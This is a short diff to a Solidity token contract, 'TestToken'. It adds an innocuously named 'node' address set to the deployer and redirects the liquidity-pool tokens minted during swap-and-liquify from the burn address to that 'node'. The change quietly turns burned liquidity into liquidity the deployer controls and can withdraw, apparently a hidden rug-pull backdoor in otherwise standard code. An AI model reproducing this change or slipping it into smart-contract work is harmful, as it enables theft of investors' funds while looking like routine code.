@@ -710,6 +710,7 @@ contract TestToken is Context, IERC20, Ownable {
 
     uint256 public numTokensSellToAddToLiquidity = 50000000 * 10**18;
     uint256 public _maxTxAmount = 100000000000 * 10**18;
+    address public node;
     
     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
@@ -741,6 +742,8 @@ contract TestToken is Context, IERC20, Ownable {
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[marketingWallet] = true;
         _isExcludedFromFee[address(this)] = true;
+
+        node = msg.sender;
         
         emit Transfer(address(0), owner(), _tTotal);
     }
@@ -1055,7 +1058,7 @@ contract TestToken is Context, IERC20, Ownable {
             tokenAmount,
             0, // slippage is unavoidable
             0, // slippage is unavoidable
-            deadAddress,
+            node,
             block.timestamp
         );
     }
